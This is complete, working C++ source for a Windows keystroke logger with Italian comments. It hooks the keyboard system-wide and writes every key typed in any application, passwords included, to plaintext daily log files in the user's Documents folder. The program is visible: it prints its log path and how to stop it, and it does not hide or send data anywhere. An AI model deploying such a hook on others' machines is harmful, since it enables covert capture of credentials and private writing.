#include <windows.h>
#include <string>
#include <vector>
#include <cstdio>

static HHOOK g_hHook = NULL;
static HANDLE g_hFile = INVALID_HANDLE_VALUE;
static LARGE_INTEGER g_pos;
static LARGE_INTEGER g_sessionStart; // il Backspace non cancella oltre l'inizio della sessione corrente
static std::vector<int> g_unitLen;   // lunghezza in byte di ogni unita' scritta, per il Backspace

static void WriteRaw(const void* data, DWORD bytes) {
    if (g_hFile == INVALID_HANDLE_VALUE || bytes == 0) return;
    DWORD written = 0;
    WriteFile(g_hFile, data, bytes, &written, NULL);
    g_pos.QuadPart += written;
}

static void AppendUnit(const std::wstring& ws) {
    if (ws.empty()) return;
    int needed = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), NULL, 0, NULL, NULL);
    if (needed <= 0) return;
    std::string utf8(needed, '\0');
    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), &utf8[0], needed, NULL, NULL);
    WriteRaw(utf8.data(), (DWORD)utf8.size());
    g_unitLen.push_back(needed);
}

static void AppendFixed(const std::string& utf8) {
    WriteRaw(utf8.data(), (DWORD)utf8.size());
}

static void RemoveLastUnit() {
    if (g_unitLen.empty()) return;
    int len = g_unitLen.back();
    LARGE_INTEGER newPos = g_pos;
    newPos.QuadPart -= len;
    if (newPos.QuadPart < g_sessionStart.QuadPart) return;
    g_unitLen.pop_back();
    SetFilePointerEx(g_hFile, newPos, NULL, FILE_BEGIN);
    SetEndOfFile(g_hFile);
    g_pos = newPos;
}

static void ProcessKeyDown(DWORD vkCode, DWORD scanCode) {
    bool ctrlDown = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
    bool altDown  = (GetKeyState(VK_MENU)    & 0x8000) != 0;
    bool isShortcut = (ctrlDown != altDown); // uno solo premuto = scorciatoia; entrambi = AltGr

    if (vkCode == VK_BACK) { if (!isShortcut) RemoveLastUnit(); return; }
    if (vkCode == VK_RETURN) { if (!isShortcut) AppendUnit(L"\r\n"); return; }
    if (vkCode == VK_TAB)    { if (!isShortcut) AppendUnit(L"\t"); return; }
    if (isShortcut) return;

    BYTE keyState[256] = {0};
    if (ctrlDown) keyState[VK_CONTROL] = 0x80;
    if (altDown)  keyState[VK_MENU] = 0x80;
    if (GetKeyState(VK_SHIFT) & 0x8000) keyState[VK_SHIFT] = 0x80;
    if (GetKeyState(VK_CAPITAL) & 1) keyState[VK_CAPITAL] = 0x01;

    wchar_t buf[8] = {0};
    int n = ToUnicodeEx(vkCode, scanCode, keyState, buf, 8, 0, GetKeyboardLayout(0));
    if (n > 0) AppendUnit(std::wstring(buf, n));
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        ProcessKeyDown(p->vkCode, p->scanCode);
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

static BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (g_hHook) { UnhookWindowsHookEx(g_hHook); g_hHook = NULL; }
    if (g_hFile != INVALID_HANDLE_VALUE) { CloseHandle(g_hFile); g_hFile = INVALID_HANDLE_VALUE; }
    return FALSE;
}

int main() {
    char userProfile[MAX_PATH] = {0};
    DWORD n = GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH);
    std::string baseDir = (n > 0) ? std::string(userProfile) + "\\Documents\\KeyLog" : "KeyLog";
    CreateDirectoryA((baseDir.substr(0, baseDir.find_last_of('\\'))).c_str(), NULL);
    CreateDirectoryA(baseDir.c_str(), NULL);

    SYSTEMTIME st;
    GetLocalTime(&st);
    char fileName[64];
    sprintf(fileName, "keylog_%04d-%02d-%02d.txt", st.wYear, st.wMonth, st.wDay);
    std::string fullPath = baseDir + "\\" + fileName;

    g_hFile = CreateFileA(fullPath.c_str(), GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hFile == INVALID_HANDLE_VALUE) {
        printf("Impossibile aprire/creare il file di log: %s (errore %lu)\n", fullPath.c_str(), GetLastError());
        return 1;
    }

    LARGE_INTEGER size;
    GetFileSizeEx(g_hFile, &size);
    bool isNewFile = (size.QuadPart == 0);
    SetFilePointerEx(g_hFile, size, &g_pos, FILE_BEGIN);

    if (isNewFile) {
        static const char bom[] = "\xEF\xBB\xBF";
        AppendFixed(bom);
    }

    char header[128];
    sprintf(header, "\r\n=== Sessione avviata: %04d-%02d-%02d %02d:%02d:%02d ===\r\n",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    AppendFixed(header);
    g_sessionStart = g_pos;

    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!g_hHook) {
        printf("Impossibile installare l'hook della tastiera (errore %lu)\n", GetLastError());
        CloseHandle(g_hFile);
        return 1;
    }

    printf("KeyLog avviato.\n");
    printf("File di log di oggi: %s\n", fullPath.c_str());
    printf("Per interrompere: chiudi questa finestra oppure premi CTRL+C.\n");

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (g_hHook) UnhookWindowsHookEx(g_hHook);
    if (g_hFile != INVALID_HANDLE_VALUE) CloseHandle(g_hFile);
    return 0;
}
